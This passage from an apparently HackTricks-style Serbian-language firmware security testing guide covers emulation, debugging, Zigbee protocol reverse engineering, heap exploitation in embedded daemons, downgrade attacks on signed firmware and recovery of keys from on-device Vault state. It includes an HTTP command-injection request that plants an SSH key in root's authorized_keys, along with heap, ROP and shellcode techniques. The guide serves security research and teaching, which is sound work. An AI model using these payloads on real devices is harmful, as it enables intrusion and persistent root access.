sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

Za ponovljivo izolovanje kvarova, upisujte vremenski označene marker fajlove na stabilan volumen sa dozvolom za upis i proveravajte ih van mreže; `/dev/kmsg`, FIFO datoteke i prolazne konzole mogu dati lažno negativne rezultate zbog ograničavanja brzine ili ranog gašenja procesa. Takođe uporedite tačne interfejse između slojeva pre menjanja nepovezanog koda: `uname -r` naspram `/lib/modules/`, ext4 funkcije na disku naspram konfiguracije kernela i generaciju Mesa `libGL` biblioteke naspram ABI-ja DRI drajvera i naziva drajvera izvedenih iz PCI podataka. Komponenta može postojati, pa čak i uspešno se učitati pomoću `dlopen()`, a ipak biti neupotrebljiva jer njen potrošač očekuje drugačiji ABI.<sup>[[11]](#references)</sup>

## Dinamička analiza u praksi

U ovoj fazi, za analizu se koristi stvarno ili emulirano okruženje uređaja. Neophodno je održavati pristup shell-u operativnog sistema i sistemu datoteka. Emulacija možda neće savršeno oponašati interakcije sa hardverom, pa će povremeno biti potrebno ponovo pokrenuti emulaciju. Analiza treba ponovo da obuhvati sistem datoteka, iskorišćavanje izloženih veb-stranica i mrežnih servisa i istraživanje ranjivosti bootloader-a. Testovi integriteta firmware-a ključni su za otkrivanje potencijalnih ranjivosti backdoor-a.

## Tehnike analize tokom izvršavanja

Analiza tokom izvršavanja podrazumeva interakciju sa procesom ili binarnom datotekom u njenom okruženju, uz korišćenje alata kao što su gdb-multiarch, Frida i Ghidra za postavljanje tačaka prekida i otkrivanje ranjivosti pomoću fuzzing-a i drugih tehnika.

Za embedded ciljne uređaje bez potpunog debugger-a, **kopirajte statički povezani `gdbserver`** na uređaj i povežite se sa njim na daljinu:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Mapiranje Zigbee / radio-ko-procesorskih poruka

U IoT hubovima RF stek je često podeljen između **radio MCU-a** i Linux korisničkog procesa. Koristan tok rada je mapiranje putanje:<sup>[[8]](#references)</sup>

1. **RF frejm** u etru
2. **Parser na strani kontrolera** na radio MCU-u
3. **Tekstualni serijski/UART ili TLV protokol** prosleđen Linuxu (na primer `/dev/tty*`)
4. **Dispečer aplikacije** u glavnom demonu
5. **Handler specifičan za protokol / mašina stanja**

Ova arhitektura stvara dve mete za reverse engineering umesto jedne. Ako kontroler pretvara binarne radio frejmove u tekstualni protokol kao što je `Group,Command,arg1,arg2,...`, utvrdite:

- **Grupe poruka** i tabele za dispečovanje
- Koje poruke mogu doći sa **mreže**, a koje od samog kontrolera
- Tačna **polja za razlikovanje specifična za proizvođača** (na primer Zigbee `manufacturer_code` i prilagođeni `cluster_command`)
- Koji handleri su dostupni samo tokom faza **commissioning**, otkrivanja ili preuzimanja firmvera/modela

Konkretno za Zigbee, snimite pairing saobraćaj i proverite da li se meta i dalje oslanja na podrazumevani **Link Key** `ZigBeeAlliance09`. Ako je tako, prisluškivanje commissioning saobraćaja može otkriti **Network Key**. Zigbee 3.0 install codes smanjuju ovu izloženost, pa zabeležite da li ih testirani uređaj zaista nameće.

### Handleri protokola specifični za proizvođača i dostupnost ograničena FSM-om

Zigbee/ZCL komande specifične za proizvođača često su bolja meta od standardizovanih klastera jer vode do **prilagođenog koda za parsiranje** i internih **FSM-ova**, čija validacija nije toliko temeljno testirana.<sup>[[8]](#references)</sup>

Praktičan tok rada:

- Obrnuto analizirajte dispečer komandi dok ne pronađete **handler dostupan samo proizvođaču**.
- Rekonstruišite tabele **stanja FSM-a**, **događaja**, **provera**, **akcija** i **sledećih stanja**.
- Utvrdite **prelazna stanja** koja automatski prelaze dalje i grane za retry/error koje na kraju resetuju ili oslobađaju stanje pod kontrolom napadača.
- Potvrdite koje legitimne razmene protokola su potrebne da bi se demon doveo u ranjivo stanje; nemojte pretpostavljati da je neispravan handler uvek dostupan.

Kod vremenski osetljivih protokola, replay paketa iz Python okruženja može biti prespor. Pouzdaniji pristup je emulacija legitimnog uređaja na stvarnom hardveru (na primer **nRF52840**) pomoću proizvođačkog steka, kako biste mogli da izložite odgovarajuće **endpoints**, **attributes** i vremenske uslove za commissioning.

### Klasa grešaka u fragmentiranim preuzimanjima u embedded demonima

Ponavljajuća klasa grešaka u firmveru javlja se pri **fragmentiranim preuzimanjima blob/model/konfiguracije**:<sup>[[8]](#references)</sup>

1. **Prvi fragment** (`offset == 0`) upisuje `ctx->total_size` i alocira `malloc(total_size)`.
2. Naredni fragmenti proveravaju samo attacker-controlled polja **lokalna za paket**, kao što je `packet_total_size >= offset + chunk_len`.
3. Kopiranje koristi `memcpy(&ctx->buffer[offset], chunk, chunk_len)` bez provere da li je vrednost unutar **prvobitno alocirane veličine**.

Napadač tako može da pošalje:

- Važeći prvi fragment sa **malom** deklarisanom ukupnom veličinom, kako bi izazvao malu alokaciju na heap-u.
- Kasniji fragment sa **očekivanim offset-om**, ali većim `chunk_len`.
- Lažiranu veličinu paketa, koja prolazi nove provere, ali ipak izaziva prekoračenje prvobitno alociranog bafera.

Kada je ranjiva putanja iza commissioning logike, eksploatacija mora da uključi dovoljno **emulacije uređaja** da bi se meta dovela u očekivano stanje preuzimanja modela ili blob-a pre slanja neispravnih fragmenata.

### Okidači za `free()` zasnovani na protokolu

U embedded demonima najlakši način da se pokrene eksploatacija metapodataka heap-a često nije „čekanje na čišćenje“, već **izazivanje sopstvenog rukovanja greškama u protokolu**:<sup>[[8]](#references)</sup>

- Pošaljite neispravne naredne fragmente da biste FSM doveli u stanja **retry** ili **error**.
- Pređite prag broja pokušaja, pa će demon **resetovati kontekst** i osloboditi oštećeni bafer.
- Iskoristite ovaj predvidljivi `free()` da biste pokrenuli primitive na strani alokatora pre nego što se proces sruši iz drugih razloga.

Ovo je naročito korisno protiv alokatora sličnih **musl/uClibc/dlmalloc** u embedded Linuxu, gde oštećenje metapodataka chunk-a može pretvoriti unlink/unbin logiku u primitivu za upis. Stabilan obrazac je oštećenje **polja veličine** kako bi se obilazak alokatora usmerio ka **lažnim chunk-ovima postavljenim unutar bafera sa prekoračenjem**, umesto da se odmah pregaze pokazivači stvarnih bin-ova i sruši proces.

## Binary Exploitation and Proof-of-Concept

Izrada PoC-a za otkrivene ranjivosti zahteva duboko razumevanje arhitekture mete i programiranje u jezicima nižeg nivoa. Zaštite binarnog okruženja tokom izvršavanja retke su u embedded sistemima, ali kada postoje, mogu biti neophodne tehnike kao što je Return Oriented Programming (ROP).

### Napomene o uClibc fastbin exploitation-u (embedded Linux)

- **Fastbin-ovi + konsolidacija:** uClibc koristi fastbin-ove slične onima u glibc-u. Kasnija velika alokacija može da pokrene `__malloc_consolidate()`, zato svaki lažni chunk mora da prođe provere (razumna veličina, `fd = 0` i okolni chunk-ovi prepoznati kao „zauzeti“).<sup>[[6]](#references)</sup>
- **Binarne datoteke koje nisu PIE pod ASLR-om:** ako je ASLR omogućen, ali glavna binarna datoteka **nije PIE**, adrese unutar binarne datoteke u `.data/.bss` su stabilne. Možete ciljati oblast koja već liči na važeće zaglavlje heap chunk-a i smestiti fastbin alokaciju u **tabelu pokazivača na funkcije**.
- **NUL koji zaustavlja parser:** pri parsiranju JSON-a, `\x00` u payload-u može da zaustavi parsiranje, a da pritom zadrži naredne bajtove pod kontrolom napadača za stack pivot/ROP chain.
- **Shellcode preko `/proc/self/mem`:** ROP chain koji poziva `open("/proc/self/mem")`, `lseek()` i `write()` može da postavi izvršivi shellcode u poznato mapiranje i da skoči na njega.

## Pripremljeni operativni sistemi za analizu firmvera

Operativni sistemi kao što su [AttifyOS](https://github.com/adi0x90/attifyos) i [EmbedOS](https://github.com/scriptingxss/EmbedOS) pružaju unapred konfigurisana okruženja za testiranje bezbednosti firmvera, opremljena neophodnim alatima.

## Pripremljeni OS-ovi za analizu firmvera

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS je distribucija namenjena bezbednosnoj proceni i penetration testing-u IoT (Internet of Things) uređaja. Štedi vam mnogo vremena tako što pruža unapred konfigurisano okruženje sa svim potrebnim alatima.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): operativni sistem za testiranje embedded bezbednosti zasnovan na Ubuntu 18.04, sa unapred instaliranim alatima za testiranje bezbednosti firmvera.

## Napadi vraćanjem firmvera na stariju verziju i nebezbedni mehanizmi ažuriranja

Čak i kada proizvođač primenjuje kriptografske provere potpisa za slike firmvera, **zaštita od vraćanja na stariju verziju (downgrade) često izostaje**. Ako boot- ili recovery-loader proverava samo potpis pomoću ugrađenog javnog ključa, ali ne upoređuje *verziju* (ili monotoni brojač) slike koja se flešuje, napadač može legitimno da instalira **stariji, ranjivi firmver koji i dalje ima važeći potpis** i tako ponovo uvede zakrpljene ranjivosti.<sup>[[4]](#references)</sup>

Tipičan tok napada:

1. **Nabavite stariju potpisanu sliku**
   * Preuzmite je sa javnog portala za preuzimanje proizvođača, CDN-a ili sajta za podršku.
   * Izdvojite je iz pratećih mobilnih/desktop aplikacija (npr. iz `assets/firmware/` unutar Android APK-a).
   * Pronađite je u repozitorijumima trećih strana kao što su VirusTotal, internet arhive, forumi itd.
2. **Otpremite sliku na uređaj ili je poslužite uređaju** preko dostupnog kanala za ažuriranje:
   * Web UI, API mobilne aplikacije, USB, TFTP, MQTT itd.
   * Mnogi IoT uređaji za potrošače izlažu *neautentifikovane* HTTP(S) krajnje tačke koje prihvataju firmware blob-ove kodirane u Base64, dekodiraju ih na strani servera i pokreću recovery/nadogradnju.
3. Nakon vraćanja na stariju verziju, iskoristite ranjivost koja je zakrpljena u novijem izdanju (na primer filter za command injection koji je dodat kasnije).
4. Po želji, ponovo flešujte najnoviju sliku ili onemogućite ažuriranja da biste izbegli otkrivanje nakon uspostavljanja persistence-a.

### Primer: Command Injection nakon vraćanja na stariju verziju

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

U ranjivom (na stariju verziju vraćenom) firmware-u, parametar `md5` se direktno nadovezuje na shell komandu bez sanitizacije, što omogućava ubacivanje proizvoljnih komandi (u ovom slučaju – omogućavanje root pristupa zasnovanog na SSH ključu). Kasnije verzije firmware-a uvele su osnovni filter znakova, ali zbog odsustva zaštite od vraćanja na stariju verziju ta ispravka nema efekta.<sup>[[4]](#references)</sup>

### Izdvajanje firmware-a iz mobilnih aplikacija

Mnogi proizvođači uključuju kompletne slike firmware-a u svoje prateće mobilne aplikacije kako bi aplikacija mogla da ažurira uređaj preko Bluetooth-a/Wi-Fi-ja. Ovi paketi se obično čuvaju nešifrovani u APK/APEX fajlu, na putanjama kao što su `assets/fw/` ili `res/raw/`. Alati kao što su `apktool`, `ghidra` ili čak običan `unzip` omogućavaju izdvajanje potpisanih slika bez fizičkog pristupa hardveru.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### Zaobilaženje zaštite od vraćanja na stariju verziju samo u updater-u kod dizajna sa A/B slotovima

Neki proizvođači zaista implementiraju **ratchet** za sprečavanje vraćanja na stariju verziju, ali samo unutar logike *updater-a* (na primer, UDS rutina preko CAN-a, komanda za oporavak ili OTA agent u userspace-u). Ako **bootloader** kasnije proverava samo potpis/CRC slike i veruje tabeli particija ili metapodacima slotova, zaštita od vraćanja na stariju verziju i dalje može da se zaobiđe.<sup>[[7]](#references)</sup>

Tipičan slab dizajn:

- Metapodaci firmvera sadrže i deskriptor verzije i **security ratchet** / monotoni brojač.
- Updater upoređuje ratchet slike sa vrednošću sačuvanom u postojanom skladištu i odbija starije potpisane slike.
- **Bootloader** ne parsira taj ratchet i pre pokretanja izabranog slota proverava samo zaglavlje, CRC i potpis.
- Aktivacija slota čuva se odvojeno, u tabeli particija ili brojaču generacije za svaki slot, i nije kriptografski vezana za tačan sažetak firmvera koji je validiran.

U sistemima sa dva slota, to omogućava primitivu **validiraj jednu sliku / pokreni drugu sliku**. Ako napadač može da navede updater da označi slot B kao sledeće odredište za pokretanje koristeći aktuelnu potpisanu sliku, a zatim može da prepiše slot B pre ponovnog pokretanja, bootloader i dalje može da pokrene vraćenu na stariju verziju sliku, jer veruje samo već upisanim metapodacima slota.

Uobičajen obrazac zloupotrebe:

1. Učitajte **aktuelni potpisani** firmver u pasivni slot i pokrenite uobičajenu rutinu za validaciju/prebacivanje, tako da raspored označi taj slot kao sledeći aktivni.
2. **Nemojte još ponovo pokretati uređaj**. U istoj sesiji ponovo pokrenite rutinu za pripremu/brисање slota.
3. Iskoristite zastarelo stanje pokрetanja ili zastarelu logiku izbora slota da bi updater obrisao **isti fizički slot** koji je upravo promovisan.
4. Upišite u taj slot **stariji, ali i dalje potpisani** firmver.
5. Preskočite rutinu za validaciju koja sprovodi ratchet i direktno ponovo pokrenite uređaj.
6. Bootloader izabere promovisani slot, proveri samo potpis/integritet i pokrene staru sliku.

Na šta treba obratiti pažnju pri reverznom inženjeringu implementacija A/B ažuriranja:

- Izbor slota zasnovan na **zastavicama pri pokretanju** koje se ne osvežavaju nakon uspešnog prebacivanja.
- Rutina u stilu `prepare_passive_slot()`, koja briše slot na osnovu zastarelog stanja umesto **trenutnog potvrđenog rasporeda**.
- Funkcija u stilu `part_write_layout()`, koja samo uvećava **brojač generacije** / aktivnu zastavicu, ali ne čuva sažetak validirane slike.
- Provere ratchet-a implementirane u userspace-u ili kodu updater-a, ali **ne** u ROM-u / bootloader-u / fazama secure boot-a.
- Rutine za brisanje ili oporavak koje ostavljaju slot označenim kao pokretljivim čak i nakon što je njegov sadržaj obrisan i ponovo upisan.

### Kontrolna lista za procenu logike ažuriranja

* Da li je transport/autentifikacija *endpoint-a za ažuriranje* adekvatno zaštićena (TLS + autentifikacija)?
* Da li uređaj pre flešovanja proverava **brojeve verzija** ili **monotoni brojač za sprečavanje vraćanja na stariju verziju**?
* Da li se slika proverava unutar lanca secure boot-a (npr. potpise proverava ROM kod)?
* Da li **bootloader sprovodi isti ratchet** kao updater, umesto da proverava samo potpis/CRC?
* Da li su metapodaci za aktivaciju slota **vezani za sažetak/verziju validiranog firmvera**, ili se slot može izmeniti nakon promocije?
* Nakon uspešnog prebacivanja slota, da li se uređaj prisilno ponovo pokreće ili su kasnije rutine za ažuriranje/brisanje i dalje dostupne u istoj sesiji?
* Da li kod u userland-u obavlja dodatne provere ispravnosti (npr. dozvoljena mapa particija, broj modela)?
* Da li *delimični* ili *rezervni* tokovi ažuriranja ponovo koriste istu logiku validacije?

> 💡  Ako nešto od navedenog nedostaje, platforma je verovatno ranjiva na napade vraćanja na stariju verziju.

## Ranjivi firmver za vežbu

Za vežbanje otkrivanja ranjivosti u firmveru, kao polaznu tačku koristite sledeće projekte ranjivog firmvera.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Oporavak ključeva za dešifrovanje firmvera iz ugrađenog stanja KMS/Vault-a

Kada slika ažuriranja sadrži malo metapodataka u otvorenom tekstu i veliki blob sa visokom entropijom, prvo analizirajte kontejner, pre nego što pokušate bilo šta da razbijete grubom silom:<sup>[[1]](#references)</sup>

- Izbacite zaglavlja, ofsete i granice redova pomoću `hexdump`, `xxd`, `strings -tx`, `base64 -d` i `binwalk -E`.
- `Salted__` obično označava OpenSSL `enc` format: narednih 8 bajtova je salt, a preostali bajtovi su šifrat.
- Base64 polje koje se dekodira u tačno `256` bajtova snažan je pokazatelj da je reč o RSA-2048 šifratu koji obavija nasumičnu lozinku/ključ sesije za firmver.
- Odvojeni PGP materijal u istoj datoteci često štiti samo autentičnost; nemojte pretpostaviti da se njime obezbeđuje poverljivost.

Ako potraga za statičkim ključevima (`grep`, `strings`, PEM/PGP pretrage) ne uspe, reverzno analizirajte **operativni put dešifrovanja** umesto da samo tražite privatne ključeve:

- Dekompajlirajte updater / binarni fajl za upravljanje i pratite ko čita šifrovani blob, koja pomoćna funkcija/API ga dešifruje i koje logičko ime ključa zahteva.
- Pretražite izdvojeni root filesystem za KMS stanje (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`) i fajlove jedinica i init skripte.
- Tretirajte otvoreni tekst poput `vault operator unseal ...`, ključeve za oporavak, bootstrap tokene ili lokalne KMS skripte za automatsko otpečaćivanje kao ekvivalent materijalu privatnog ključa.

Ako uređaj isporučuje originalni Vault binarni fajl i backend za skladištenje, obično je lakše ponovo pokrenuti to okruženje nego ponovo implementirati Vault interne mehanizme:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Sa root pristupom na kloniranom KMS-u:

- Učinite transit ključeve izvozivim samo unutar izolovanog klona: `vault write transit/keys/<name>/config exportable=true`
- Izvezite unwrap ključ: `vault read transit/export/encryption-key/<name>`
- Isprobajte oporavljeni RSA ključ uz tačan par padding/hash koji koristi KMS. Neuspešna dekripcija PKCS#1 v1.5 i neuspešna podrazumevana OAEP dekripcija **ne** dokazuju da je ključ pogrešan; mnogi tokovi zasnovani na Vault-u koriste OAEP sa SHA-256, dok uobičajene biblioteke podrazumevano koriste SHA-1.
- Ako payload počinje sa `Salted__`, tačno reprodukujte vendorov OpenSSL KDF (`EVP_BytesToKey`, često MD5 na starijim uređajima) pre pokušaja AES-CBC dekripcije.

Time „šifrovani firmware” postaje opštiji problem: **oporavite operativne ključeve na strani uređaja, a zatim van mreže reprodukujte tačne parametre unwrap + KDF**.

## Obuke i sertifikacije

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Razbijanje firmware-a uz Claude: veštine na seniorskom nivou, autonomija na juniorskom nivou](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Metodologija testiranja bezbednosti firmware-a](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Praktično IoT hakovanje: Definitivni vodič za napade na Internet stvari](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Iskorišćavanje zero-day ranjivosti u napuštenom hardveru – blog Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Kako mi je pametni uređaj od 20 dolara omogućio pristup vašem domu](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Sad me vidiš: sad si pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Iskorišćavanje Tesla Wall Connector-a preko priključka za punjenje - 2. deo: zaobilaženje zaštite od vraćanja na stariju verziju](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Neka zatreperi: iskorišćavanje Philips Hue Bridge-a putem bežičnog ažuriranja](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [ROOT Tesla OS na QEMU, 1. deo: raspakivanje](https://cn0xroot.wordpress.com/2026/09/19/root-tesla-os-on-qemu-part-1-unpacking)
- [10] [Dokumentacija Linux kernela - dm-linear](https://docs.kernel.org/admin-guide/device-mapper/linear.html)
- [11] [ROOT Tesla OS na QEMU, 2. deo: otklanjanje grešaka i ispravke](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
- [12] [Dell BIOS lozinke: slaba XOR enkripcija omogućava oporavak iz SPI fleša (CVE-2026-40639)](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
- [13] [R3n5k1/dellpwn - alati za oporavak Dell BIOS lozinki](https://github.com/R3n5k1/dellpwn)
- [14] [VoidStar Security — Osvežavanje znanja o hakovanju hardvera, 2. deo](https://voidstarsec.com/blog/brushing-up-part-2)
{{#include ../../banners/hacktricks-training.md}}
